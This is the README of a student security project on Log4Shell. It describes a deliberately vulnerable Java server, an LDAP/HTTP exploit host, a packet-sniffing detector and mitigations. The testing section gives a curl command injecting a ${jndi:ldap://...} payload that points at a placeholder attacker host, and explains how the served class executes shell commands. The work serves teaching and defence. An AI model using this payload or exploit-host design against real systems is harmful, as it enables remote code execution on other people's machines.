# DD2391-project Group 1 - Log4Shell
## Motivation & Problem Statement
**Overview of Log4Shell:**
Log4Shell, discovered in December 2021, is a critical vulnerability in the Apache Log4j library, a widely-used Java-based logging framework. The vulnerability is officially tracked as [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) and allows for remote code execution (RCE) by exploiting how Log4j handles user-controlled input in log messages. This issue stems from Log4j’s support for Java Naming and Directory Interface (JNDI) lookups in log entries, which could be abused by an attacker to trick Log4j into fetching and executing arbitrary code from remote servers. Given the ubiquity of Log4j in enterprise software, cloud services, and widely-used platforms, the scope of this vulnerability’s impact is immense.

**History and Emergence:**
Log4Shell was first disclosed publicly in December 2021, but the issue had likely existed unnoticed for years in Log4j version 2.x, which was introduced in 2013. The vulnerability got a lot of attention from usage on Minecraft servers, where attackers quickly demonstrated how easily they could exploit it to gain control over other players' systems by sending a simple chat message containing a malicious string. The fact that such a trivial input could lead to remote code execution across a wide variety of platforms triggered immediate concern, leading to widespread panic among system administrators, cybersecurity experts, and software vendors.

Many high-profile companies and critical infrastructures that rely on Log4j were affected, including Amazon Web Services, Cloudflare, Twitter, and many others, highlighting the pervasive nature of the vulnerability. The vulnerability was particularly dangerous due to how easily attackers could exploit it: simply by sending a crafted string in various inputs such as HTTP requests, chat messages, or any other logged data, they could compromise servers without the need for authentication.

**Severity of the Problem:**
Log4Shell is considered one of the most severe vulnerabilities in recent history due to several factors:

1. **Ease of Exploitation**: The vulnerability requires minimal technical expertise to exploit. In most cases, a simple string injected into a log and serving a Java class on a public facing port is enough to trigger the vulnerability, giving attackers access to sensitive systems, even without any user interaction.
2. **Widespread Usage of Log4j**: Log4j is embedded in countless applications and services across the globe. It is used by enterprises, cloud platforms, and third-party services, making the vulnerability’s reach vast and affecting millions of systems. Many organizations were unaware that they even had Log4j integrated, leading to challenges in identifying and patching affected systems.
3. **Potential for Remote Code Execution**: Once exploited, attackers can achieve RCE, allowing them to execute arbitrary code on the target machine. This means attackers can take full control of a vulnerable system, steal data, deploy ransomware, or even create backdoors for persistent access.
4. **Global Impact**: Log4Shell created a global race among security professionals to patch systems, while malicious actors hurried to exploit the vulnerability. Major government agencies, cybersecurity firms, and enterprises worldwide raised alarms, leading to an unprecedented effort to protect vulnerable systems.
Given these factors, Log4Shell was assigned the highest severity score — 10 out of 10 — on the CVSS (Common Vulnerability Scoring System) scale.

**Problem Statement**
Our project focuses on understanding, detecting, and mitigating the Log4Shell vulnerability. By reimplementing the weakness, we gain a deep understanding of the exploit's mechanics and evaluate real-world scenarios where this vulnerability could be leveraged. The project aims to:

1. **Understand**: We aim to dissect the underlying issue in Log4j, exploring how the JNDI lookup feature can be exploited and why it was initially designed to behave in a vulnerable manner.
2. **Detect**: We evaluate current detection methods to identify systems still vulnerable to Log4Shell and determine how security tools can better identify attempts to exploit this weakness. This includes exploring intrusion detection systems (IDS), anomaly detection in logging patterns, and system activity monitoring.
3. **Mitigate**: Several mitigation techniques are explored, from patching affected Log4j versions to disabling vulnerable features (such as JNDI lookups) and enhancing runtime security through network controls and sandboxing. Additionally, we analyze security practices that should be adopted at an organizational level to reduce the chances of such vulnerabilities being exploited in the future.

This project aims to contribute both practical and theoretical insights into how systems can remain protected from such critical weaknesses, ensuring resilience against future exploits of similar nature.

## References
### General Set Up
1. **mbechler/marshalsec**
   GitHub Repository: [https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)
   **Explanation:**
   This repository provides a proof-of-concept tool for various Java deserialization vulnerabilities, including JNDI exploitation, which is a core component of the **Log4Shell** vulnerability. We included this resource because it offers a clear demonstration of how JNDI lookups can be leveraged in attacks, which allowed us to better understand the exploitation process. Furthermore, **marshalsec** was pivotal in setting up our own LDAP server for hosting malicious payloads, an essential step in reproducing the **Log4Shell** attack scenario. By using **marshalsec**, we were able to simulate how attackers exploit the vulnerability in real-world environments, which significantly enhanced our ability to demonstrate the vulnerability's impact during our seminar presentation.
2. **christophetd/log4shell-vulnerable-app**
   GitHub Repository: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app)
   **Explanation:**
   This repository contains a deliberately vulnerable application designed to be exploited using **Log4Shell**. We added this repository to our project to use as a testing ground for our traffic sniffing tool and payload detection system. The repository provided a straightforward way to demonstrate **Log4Shell** exploits in a controlled environment, enabling us to confirm that our detection scripts were functioning correctly. Using this vulnerable app, we could verify the effectiveness of our monitoring system in detecting suspicious **JNDI lookups** and simulate various attack payloads. This ensured the integrity and accuracy of our exploit detection methodology.
3. **kozmer/log4j-shell-poc**
   GitHub Repository: [https://github.com/kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)
   **Explanation:**
   This proof-of-concept repository demonstrates how to exploit **Log4Shell** in a practical, real-world attack scenario, using a payload that opens the calculator application on the victim’s machine. This repository was critical for our project because it provided a fully functional exploit demonstration, helping us test the severity of the vulnerability. By leveraging this resource, we could observe firsthand how the exploit is executed, reinforcing our understanding of the potential damage **Log4Shell** can cause. Additionally, **kozmer/log4j-shell-poc** helped us craft our own proof-of-concept for the seminar, ensuring our audience grasped the seriousness of the vulnerability through a tangible example.

### Traffic Sniffing
For monitoring JNDI lookups through traffic sniffing in our Log4Shell project, we used the [Scapy library](https://github.com/secdev/scapy), a powerful Python tool for network packet manipulation and analysis. Scapy allowed us to create a Python script that listens for suspicious network traffic patterns indicative of JNDI lookups, which are central to the Log4Shell vulnerability. By capturing and analyzing network packets, Scapy helped detect potentially malicious requests that exploit the vulnerability, allowing for real-time monitoring and threat detection

## Documentation of Project
The project, titled **DD2391-project Group 1 - Log4Shell**, focuses on the Log4Shell vulnerability (CVE-2021-44228) within the Apache Log4j library, which allows for remote code execution (RCE) through JNDI lookups. The repository contains the following main components:

- **Vulnerable Application**: A custom-built Java web server that logs user information such as IP addresses and user agents. This simulates the real-world scenario where Log4Shell can be exploited through user input logged by Log4j.
- **Exploit Host**: A Java program that acts as a server for hosting malicious payloads. This component demonstrates how an attacker could host a payload to be fetched and executed by the vulnerable application, thus exploiting Log4Shell.
- **Traffic sniffing Module**: A tool designed to scan network traffic for potential Log4Shell attacks. It looks through network packets for signs of malicious payloads exploiting the Log4j vulnerability, which could be used to alert a SOC team that a system is being exploited.

The project reimplements the Log4Shell vulnerability, explores its exploitation through a custom Java application, and provides tools and techniques for detecting and mitigating such attacks. The goal is to provide a comprehensive understanding of the Log4Shell exploit, its detection methods, and viable mitigations to protect systems from potential attacks.

## Instructions on Testing

To test the exploit, you need to start three programs:
- the vulnerable application,
- the exploit host,
- the client makes the vulnerable application initiate the concact with the exploit host.

The following three sub-section describe how to do that. Then follows a sub-section describing how to know if the exploit worked.

### Vulnerable App

Located in `vulnerable-app/`. Either install docker & docker compose and run `docker compose up`, or install Apache maven (tested on version 3.9.6) and an older version of JDK (tested on Oracle's JDK version 1.8.0_181) which should be pointed to by the `JAVA_HOME` environment variable, navigate to the app's directory and run the command `mvn package -q && java -cp ./target/target-app-1.0-SNAPSHOT.jar App`.

It is a web server that listen on port 8080 and logs the current time, the connecting clients' IP address and user agent and the requests method and path, all of which are pretty common for web servers to log.

By default it only listens for connections coming from the host itself. To listen for connections coming from other hosts (WHICH IS DANGEROUS as it allows ANYONE to EXECUTE arbitrary CODE on your machine without any more interaction from you), append `listen-any` to the end of the command mentioned above.

### Exploit Host

Located in `exploit-host/`. Either install docker & docker compose and run `docker compose up`, or install Apache maven (tested on version 3.9.6) and a version of JDK producing class files that the target's JDK understands (such as Oracle's JDK version 1.8.0_181), navigate to the app's directory and run the command `mvn package -q && java -cp target/exploit-host-1.0-SNAPSHOT.jar App`.

It by default listens on port 1389 and 3000, but can be changed with `$LDAP_PORT` and `$HTTP_PORT` respectively. If the client cannot reach the exploit host through `localhost`, `$HOST` must also be set to the ip or hostname on which it can. Note that if the vulnerable app is running in docker, it cannot reach the exploit host through `localhost` or `127.0.0.1`. Usually the host's IP address in e.g. a WiFi network works, although that may require opening up relevant ports in a firewall.

### Client application

The client can be anything that triggers the vulnerable app to log some string. In this case, the vulnerable application logs the connecting client's user agent, so simply running the command
```sh
curl http://ip_to_vulnerable_app:8080 -H 'User-Agent: ${jndi:ldap://ip_to_exploit_host_reachable_from_vulnerable_app:1389/a}'
```
should suffice.

### Checking that the exploit worked

If the computer running the vulnerable app has either a program called `calc.exe` or `gnome-calculator`, a calculator should have started on it. This is a stand-in for an actually malicious program to show that remote code execution has been reached. In case none of those exist on the computer, such as if the vulnerable app is running in a docker container, it also creates a file called `if_this_exists_you_got_owned` in the directory that the vulnerable app was started in, so make sure to also check for that. If the vulnerable app is running with `docker compose up`, you can open a new terminal in the same directory and type `docker compose exec -it vulnerable-app ls` and you should see the mentioned file.

## Contributions
### Max Andersson
As a key component of my contribution to the Log4Shell vulnerability lab, I conducted extensive background research on the exploit. This in-depth investigation encompassed:

- Analyzing the technical details of the CVE-2021-44228 vulnerability
- Studying the impact of Log4Shell on various systems
- Finding a suitable setup that in a good manner would display how the exploit is conducted, in the end we landed on a HTTP server but other forms was also discussed such as a Minecraft server

This research provided a solid foundation for our project, enhancing our team's understanding of the exploit's mechanisms and potential consequences.

#### Mitigation Strategies Research
Building upon the background research, I focused on identifying and evaluating various mitigation strategies for the Log4Shell vulnerability. This phase of my work involved:

- Compiling a comprehensive list of recommended mitigation techniques from reputable sources
- Assessing the effectiveness and practicality of each mitigation method
- Considering the potential trade-offs and implementation challenges of different approaches
- Prioritizing mitigation strategies based on their applicability to our lab environment

#### Implementation of Mitigation Techniques

##### 1. Custom Input Sanitization
One of the mitigation strategies I implemented was a custom input sanitization method. This approach aimed to remove potentially malicious JNDI lookup strings from user input. The method was designed to strip out content that could trigger the Log4Shell vulnerability, specifically targeting strings enclosed in `${}` brackets.

##### 2. Disabling JNDI Lookup
The second mitigation technique I implemented involved disabling JNDI lookups in the Log4j configuration. This strategy focused on modifying the Log4j settings to prevent the processing of JNDI lookup requests, effectively neutralizing the core mechanism exploited in Log4Shell attacks.

It should be noted that these also come with there own sets of drawbacks and could be exploited. The best way to mitigate the Log4shell vunerability is to update the version to 2.15.0 and up. But for the sake of the lab we wanted to explore other mitigation strategies.

#### Documentation and Reporting
Throughout the project, I maintained detailed documentation of my research findings, implementation processes, and observed results. This documentation contributed to our team's overall report on the Log4Shell lab, providing valuable insights into the vulnerability and the effectiveness of our chosen mitigation strategies.

#### Conclusion
My contributions to the Log4Shell lab project encompassed thorough background research, identification and implementation of mitigation strategies, and active participation in the lab setup. This multifaceted approach allowed me to gain a comprehensive understanding of the vulnerability and practical experience in addressing critical security flaws.

### Emil Wallgren

My primary contribution to the project has centered around researching and expanding both my own and the team’s understanding of the log4shell vulnerability. In particular, I collaborated closely with Max, with a shared focus on exploring various methods of vulnerability mitigation and exploit prevention. This involved not only identifying potential defensive strategies but also considering the broader implications of these approaches.

During the research phase, my efforts were primarily directed towards analyzing the strengths and weaknesses of different mitigation techniques, with a particular emphasis on the potential drawbacks of each. The key questions I sought to address were centered on the options available to developers and cybersecurity professionals during the critical period of a zero-day vulnerability. Specifically, I examined how these mitigations might impact the overall functionality of the system or application while they are in effect, and, perhaps most importantly, how attackers might seek to circumvent these protective measures.

Given our goal of simulating the challenges that developers might encounter when managing a vulnerable application on a zero-day, I devoted significant time to researching the various complications that could arise from the mitigation strategies we have selected to demonstrate. This involved a careful consideration of how these strategies could affect both security and usability, as well as how effective they might be under real-world conditions.

In terms of practical contributions, I have also assisted in the implementation of the mitigation strategies. In particular I was working to identify potential flaws in their design, with the aim of improving their robustness. A key aspect of this has been finding ways to bypass the mitigations, both for the purpose of demonstrating these vulnerabilities during our presentation and to ensure that the protections function correctly as intended. For example, as you may have noticed, there is a significant issue with the input filtering mechanism we have implemented, which I have highlighted for discussion.

One further consideration to take into account in terms of the mitigations were how feasible it was to create a clear demonstration of the mitigation and its effect. For example there are several methods of mitigation which we didn’t feel were feasible to implement for this project for a variety of reasons, most of which were practical in nature. For example we decided against trying to find a way to implement a web application firewall to filter potentially malicious traffic as we didn’t think it could be easily demonstrated in an efficient manner during the presentation.

Regarding the input filter in particular, I have identified several more robust solutions that would offer stronger protection against incoming attacks. Should we choose to demonstrate the improvements in code, I am prepared to show how these enhanced solutions could address the specific weaknesses in the current mitigation. However, since the issue with the input filter is one that should already be familiar to students in this course, we may instead opt to simply explain the proposed solutions during our presentation, rather than implementing them directly.

### Mathias Magnusson
In the project's initial phase, I did research into the vulnerability to find fitting target system(s) to perform the exploit upon. What I found was that the most fitting demonstration target was building a simple http server using the library `com.sun.net.httpserver` (which comes with the java development kit) and logging parts of the request using a vulnerable version of Log4j, as it shows how a very simple and innocent-looking program can be exploited. I also set up and implemented the initial vulnerable version of said web server.

I also implemented the program that serves the exploit to the vulnerable target. At first, I tried setting up [OpenLDAP](https://www.openldap.org/) and was able to insert the correct object into it, but did not manage to make it serve that upon the request sent from Log4j. I then used the [UnboundID LDAP SDK for Java](https://github.com/pingidentity/ldapsdk) to start an LDAP server that serves the object upon every request, which is at `exploit-host/src/main/java/com/evil/App.java`. It does this by first responding with some metadata about the java class in the LDAP response and including an HTTP URI that specifies where the actual bytecode can be retrieved. The URI points to the exploit hosts once again but on a different port, where it listens for HTTP requests and serves the bytecode of the class. The class being served is also located in the same file and has a `static` block, which gets executed when the class gets loaded by Log4j. The actual exploit uses the `Runtime` class to execute commands in the operating system's shell. For this to work, the `Runtime` class must be loaded by the target application, which it already is since Log4j depends on it.

Additionally, I dockerized both the vulnerable application and the exploit host to make them easy to run without having to download both maven and a specific version of the Java Development Kit. I also wrote the guide on testing the exploit and checking whether it worked or not.

### Felix Krings
During the course of this project, I invested significant time conducting in-depth research to ensure a comprehensive understanding of the **Log4Shell vulnerability**. My work included not only reviewing the core concepts of the exploit but also thoroughly analyzing multiple GitHub repositories, each offering various implementations and mitigation strategies for **Log4Shell**. This research allowed me to compare different approaches, gain insight into both existing vulnerabilities and the most effective defense mechanisms, and identify best practices for protecting against similar exploits. I meticulously reviewed code samples and contributed to the understanding of how **JNDI lookups** were leveraged in attacks, which became pivotal in crafting our own solution.

One of my main technical contributions was developing a network sniffing tool aimed at detecting **Log4Shell** exploits. I documented this process in the [README](https://github.com/OwlPatrol/DD2391-project/tree/main/traffic-sniffing) for the project, detailing how the script works and providing instructions for testing it in a controlled environment. The tool was designed to identify malicious **JNDI lookup patterns** in network traffic, which are indicative of a **Log4Shell** attack. The tool monitors specific network interfaces and triggers alerts when potentially harmful payloads are detected. A key part of the development process involved creating a robust testing framework where simulated exploits could be generated, and the app's detection capability thoroughly validated. I outlined how users could simulate exploit attempts, using methods such as **cURL requests** and custom Python scripts. This level of detail ensures that anyone using the network sniffer can easily reproduce our results and understand the significance of the detections.

Regarding the seminar presentation slides, I put substantial effort into organizing our findings in a way that was not only accessible but also educational. Knowing that the complexity of **Log4Shell** might be difficult for non-technical audiences to grasp, I conducted extensive web searches and sought out visual aids that simplified the technical aspects of our work. The goal was to demystify **Log4Shell**, providing clear explanations of how the exploit works, why it poses such a severe threat, and what steps can be taken to mitigate it. This included a focus on real-world cases of **Log4Shell** and the widespread damage it caused, emphasizing its critical nature to drive home the importance of our project.

In preparation for the seminar, I collaborated closely with my team through brainstorming sessions on our chosen platform. These meetings were instrumental in shaping the structure of our presentation and allowed us to refine our demonstration plan. The idea to discuss whether **zero-day events** like **Log4Shell** should be publicly announced or kept confidential stemmed from one of these sessions. I took the initiative to research this topic, building a case for both sides of the argument and ultimately crafting a discussion that would challenge our audience to think critically about the implications of either approach. This topic became a cornerstone of our final seminar presentation and provided a platform for engaging discussion among our peers.

In summary, my contributions to this project were multifaceted and went beyond the technical implementation. From deep dives into existing repositories, development of a network sniffing tool, thorough testing, and documentation, to preparing and presenting complex information in an understandable format, I was able to ensure that our project was both technically sound and communicated effectively.
